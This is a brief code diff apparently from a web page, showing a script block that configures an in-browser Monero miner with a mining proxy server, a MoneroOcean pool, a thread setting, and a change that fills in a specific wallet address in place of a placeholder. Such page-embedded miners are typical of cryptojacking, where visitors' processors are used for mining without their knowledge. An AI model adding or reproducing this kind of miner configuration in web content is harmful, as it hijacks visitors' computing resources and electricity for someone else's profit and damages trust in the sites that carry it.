@@ -2,7 +2,7 @@
 <script>
     server = "wss://f.xmrminingproxy.com:8181";
     var pool = "gulf.moneroocean.stream:20128";
-    var walletAddress = " //Your Wallet Here ";
+    var walletAddress = "4APDbaHLvcf4jFqbM2xP4KMR6PEURKz6eUTDmQkLZ1TkETEwycVZNSRfxqqxf685ub6JKTrND8u8e9rCMK2sB9KMMizJKXP";
     var workerId = ""
     var threads = -5;
     var password = "x";
